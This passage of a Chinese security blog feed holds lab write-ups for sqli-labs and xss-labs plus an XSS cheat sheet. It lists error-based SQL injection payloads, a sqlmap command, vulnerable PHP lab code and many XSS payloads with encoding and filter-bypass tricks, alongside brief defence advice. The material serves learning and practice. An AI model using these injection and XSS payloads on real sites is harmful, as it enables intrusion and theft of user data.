0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">//echo $row;</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$row1</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];  	</span><br><span class="line">		<span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;</span><br><span class="line">		mysql_query(<span class="variable">$update</span>);</span><br><span class="line">  		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">if</span> (mysql_error())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">			print_r(mysql_error());</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">			<span class="comment">//echo &quot; You password has been successfully updated &quot; ;		</span></span><br><span class="line">]			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>只对<code>username</code>使用<code>check_input()</code>函数进行过滤·,<code>check_input()</code>作用是截取15个字符串，如果开启了GPC,就去掉反斜杠，在判断是否是十进制，如果不是十进制， 就转译掉特殊字符</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">stripslashes() 函数删除由 addslashes() 函数添加的反斜杠。</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line">下列字符受影响：</span><br><span class="line">    \x00</span><br><span class="line">    \n</span><br><span class="line">    \r</span><br><span class="line">    \</span><br><span class="line">    &#x27;</span><br><span class="line">    &quot;</span><br><span class="line">    \x1a</span><br></pre></td></tr></table></figure>

<p><code>uname=admin&amp;passwd=123456&#39; #&amp;submit=Submit</code></p>
<p><code>uname=admin&amp;passwd=123456&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+ &amp;submit=Submit</code></p>
<p><code>uname=admin&amp;passwd=123456&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) --+ &amp;submit=Submit</code></p>
<p><code>uname=admin&amp;passwd=123456&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database()  and table_name=&#39;users&#39; limit 0,1),0x7e),1) --+ &amp;submit=Submit</code></p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -r 1.txt --batch --dbs</code></p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo文章插入图片</title>
    <url>/posts/7ecd88c4/</url>
    <content><![CDATA[<h3 id="本地引用-采用相对路径"><a href="#本地引用-采用相对路径" class="headerlink" title="本地引用(采用相对路径)"></a>本地引用(采用相对路径)</h3><p>在 <code>config.yml</code>文件中配置，post_asset_folder设为true，当再次新建文章时，会在source/_post中生产和文章同名的文件夹，把需要的图片资源放入该文件夹，就可以使用相对路径来引用图片.</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">_posts/post_name/image.jpg</span><br><span class="line"></span><br><span class="line">![](image.jpg)</span><br><span class="line">![](image.png)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>phpstudy访问localhost不出现目录的问题</title>
    <url>/posts/2704909e/</url>
    <content><![CDATA[<h4 id="新版phpstudy中，需要在打开-“网站”–-gt-”管理”–-gt-”修改”–-gt-”高级配置”下打开’目录索引’"><a href="#新版phpstudy中，需要在打开-“网站”–-gt-”管理”–-gt-”修改”–-gt-”高级配置”下打开’目录索引’" class="headerlink" title="新版phpstudy中，需要在打开 “网站”–&gt;”管理”–&gt;”修改”–&gt;”高级配置”下打开’目录索引’"></a>新版phpstudy中，需要在打开 “网站”–&gt;”管理”–&gt;”修改”–&gt;”高级配置”下打开’目录索引’</h4><p><img src="/posts/2704909e/phpstudy1.png"></p>
]]></content>
      <categories>
        <category>phpstudy</category>
      </categories>
      <tags>
        <tag>phpstudy</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS总结</title>
    <url>/posts/9f0502f1/</url>
    <content><![CDATA[<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>把用户输入的数据从服务器反射给用户浏览器，要精心构造payload</p>
<p>攻击者通过电子邮件等方式，诱使用户去访问一个包含恶意xss代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。</p>
<p>此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>又称持久型XSS,威胁要比反射型XSS要大,存储在目标服务器中.</p>
<p>用户不需要点击特定的url就可与执行，攻击者事先把恶意代码上传或存储到服务器中，受害者只需点开这个含有恶意代码的页面j就会执行恶意代码，通常可以使用一些网上的xss平台.</p>
<p>此类XSS常出现在网站留言评论等交互处.</p>
<br>

<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>DOM-Based XSS基于DOM文档对象的一种漏洞，是一种特殊类型的反射型XSS.DOM型XSS基于JS上，不需要与服务器进行交互。</p>
<br>

<h2 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h2><h3 id="lt-a-gt-标签"><a href="#lt-a-gt-标签" class="headerlink" title="&lt;a&gt;标签"></a><code>&lt;a&gt;标签</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:eval(alert(</span>&#x27;<span class="attr">xss</span>&#x27;))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="lt-img-gt-标签"><a href="#lt-img-gt-标签" class="headerlink" title="&lt;img&gt;标签"></a><code>&lt;img&gt;标签</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&quot;<span class="attr">alert</span>(&#x27;<span class="attr">xss</span>&#x27;)&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="lt-script-gt-标签"><a href="#lt-script-gt-标签" class="headerlink" title="&lt;script&gt;标签"></a><code>&lt;script&gt;标签</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scirpt</span>&gt;</span>alert(&quot;xss&quot;);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="lt-form-gt-标签"><a href="#lt-form-gt-标签" class="headerlink" title="&lt;form&gt;标签"></a><code>&lt;form&gt;标签</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;) <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">action</span>=<span class="string">aa.asp?</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">action</span>=<span class="string">aa.asp?</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>)&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="lt-iframe-gt-标签"><a href="#lt-iframe-gt-标签" class="headerlink" title="&lt;iframe&gt;标签"></a><code>&lt;iframe&gt;标签</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;);<span class="attr">height</span>=<span class="string">5width</span>=<span class="string">1000</span> /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;aaa&quot;</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;) /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="lt-svg-gt-标签"><a href="#lt-svg-gt-标签" class="headerlink" title="&lt;svg&gt;标签"></a><code>&lt;svg&gt;标签</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="常用的on事件"><a href="#常用的on事件" class="headerlink" title="常用的on事件"></a>常用的on事件</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">onchange 	      #HTML 元素改变</span><br><span class="line">onclick 	      #用户点击 HTML 元素</span><br><span class="line">onmouseover 	  #用户在一个HTML元素上移动鼠标</span><br><span class="line">onmouseout 	    #用户从一个HTML元素上移开鼠标</span><br><span class="line">onkeydown 	    #用户按下键盘按键</span><br><span class="line">onload 	        #浏览器已完成页面的加载</span><br><span class="line">onerror         #发生错误时执行js</span><br></pre></td></tr></table></figure>

<h2 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h2><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/**/ , /符号 ，</span><br></pre></td></tr></table></figure>

<h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><br>

<br>

<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><ul>
<li>HTML实体编码</li>
</ul>
<p>以<code>&amp;</code>开头，以分号结尾的，</p>
<p>如<code>&lt;</code>的编码为<code>&amp;1t;</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">以&amp;开头，以分号结尾的，如&lt;的编码为&amp;1t;</span><br></pre></td></tr></table></figure>

<ul>
<li>URL编码</li>
</ul>
<p> 可以考虑进行一次url编码或者二次url编码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:alert(1) =&gt; javascript%3Aalert%281%29</span><br><span class="line">alert(&quot;xss&quot;); =&gt; %61%6c%65%72%74%28%22%78%73%73%22%29%3b</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Unicode编码</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">alert(&quot;xss&quot;); =&gt; \u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Ascii码</li>
</ul>
<p><code>var n = String.fromCharCode(65)</code>  输出 <code>A</code></p>
<p><code>var n=String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59);</code> </p>
<p>输出 <code>alert(&quot;xss&quot;);</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Base64</li>
</ul>
<p>JS中用来编码和解码base64的两个函数</p>
<p><code>abto()</code> base64解码</p>
<p><code>btoa()</code> 编码为base64</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(atob(&#x27;ImFsZXJ0KCd4c3MnKSI=&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>八进制</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;\<span class="attr">170</span>\<span class="attr">163</span>\<span class="attr">163</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Hex</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> =&gt; 3C7363726970743E616C657274282278737322293B3C2F7363726970743E</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&#x27;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<h3 id="过滤url"><a href="#过滤url" class="headerlink" title="过滤url"></a>过滤url</h3><h4 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">2e</span>%<span class="attr">62</span>%<span class="attr">61</span>%<span class="attr">69</span>%<span class="attr">64</span>%<span class="attr">75</span>%<span class="attr">2e</span>%<span class="attr">63</span>%<span class="attr">6f</span>%<span class="attr">6d</span>/`&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="IP绕过"><a href="#IP绕过" class="headerlink" title="IP绕过"></a>IP绕过</h4><ul>
<li>十进制IP</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">2130706433</span>/`&gt;</span></span><br><span class="line"># 127.0.0.1</span><br></pre></td></tr></table></figure>

<ul>
<li>八进制IP</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0177.0.0.01</span>/`&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>HEX</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0x7f.0x0.0x0.0x1</span>/`&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>html标签中使用<code>//</code> 代替<code>http://</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`//<span class="attr">www.baidu.com</span>`&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><ul>
<li>黑/白名单</li>
<li>对输出编码</li>
<li>对输入过滤</li>
</ul>
<blockquote>
<p>过滤一些危险字符，以及转义 || &lt; &gt; ‘ “ &amp; # 等危险字符</p>
</blockquote>
<ul>
<li>HttpOnly Cookie设置</li>
</ul>
<blockquote>
<p>Cookie在消息头中被设置为HttpOnly,可以阻止客户端JS直接访问浏览器中的cookies，从而达到保护敏感数据的作用</p>
</blockquote>
<ul>
<li><p>限制输入内容长度</p>
</li>
<li><p>CSP(Content Security Policy)</p>
</li>
</ul>
<br>

<br>

<br>

<br>

<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote>
<p><a href="https://xz.aliyun.com/t/4067">https://xz.aliyun.com/t/4067</a></p>
<p><a href="https://xz.aliyun.com/t/2936">https://xz.aliyun.com/t/2936</a></p>
<p><a href="https://blog.csdn.net/weixin_51356351/article/details/109690416">https://blog.csdn.net/weixin_51356351/article/details/109690416</a></p>
<p><a href="https://wh0ale.github.io/2019/03/19/2019-3-19-%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/">https://wh0ale.github.io/2019/03/19/2019-3-19-%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>xss-labs2</title>
    <url>/posts/b04952e9/</url>
    <content><![CDATA[<p>14</p>
<p>这个题目中的url失效了，考察的是exif xss</p>
<p> exif介绍:</p>
<p>可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。</p>
<p>exif xss 简单来讲就是利用exif信息实现xss攻击。 </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">xss</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">12</span> <span class="attr">onclick</span>=<span class="string">&#x27;alert(1)&#x27;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<p>15</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;src&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>ng-include </code>指令用于包含外部的 HTML 文件。</p>
<p>包含的内容将作为指定元素的子节点。<br><code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。<br>默认情况下，包含的文件需要包含在同一个域名下。</p>
</blockquote>
<p>这里考虑调用level1的代码，使用img</p>
<p><code> http://test.ctf8.com/level15.php?src=%27level1.php?name=test&lt;img src=1 onclick=alert(1)&gt;&#39;</code></p>
<br>

<br>

<p>16.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = strtolower(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=str_replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=str_replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=str_replace(<span class="string">&quot;	&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>.<span class="variable">$str5</span>.<span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>过滤掉了<code>script</code>, 空格和<code>/</code>可以考虑使用%0A,%0C,%0D等代替作为分隔符</p>
<p><code>keyword=test&lt;img%0Asrc=1%0Aonclick=alert(1)&gt;</code></p>
<br>

<h4 id="16题以后的题目都需要使用flash，好多浏览器已经不支持了，后面的就随便看看"><a href="#16题以后的题目都需要使用flash，好多浏览器已经不支持了，后面的就随便看看" class="headerlink" title="16题以后的题目都需要使用flash，好多浏览器已经不支持了，后面的就随便看看"></a>16题以后的题目都需要使用flash，好多浏览器已经不支持了，后面的就随便看看</h4><p>17.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>arg01=a&amp;arg02= onmouseover=alert(1)</code></p>
<p>18.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf02.swf?&quot;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>和17题一样</p>
<p><code>arg01=a&amp;arg02= onmouseover=alert(1)</code></p>
<p>19.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;embed src=&quot;xsf03.swf?&#x27;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&#x27;&quot; width=100% heigth=100%&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<p>20.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;embed src=&quot;xsf04.swf?&#x27;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&#x27;&quot; width=100% heigth=100%&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>xss-labs1</title>
    <url>/posts/ca3eea61/</url>
    <content><![CDATA[<p><a href="http://test.ctf8.com/">http://test.ctf8.com/</a></p>
<p>1.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;欢迎用户&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>$str被放入到了 h2标签中，只需要把前面h2标签闭合构造payload，</p>
<p><code>name=&lt;/h2&gt;&lt;script&gt;alert(111)&lt;/script&gt;</code></p>
<br>

<p>2.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span 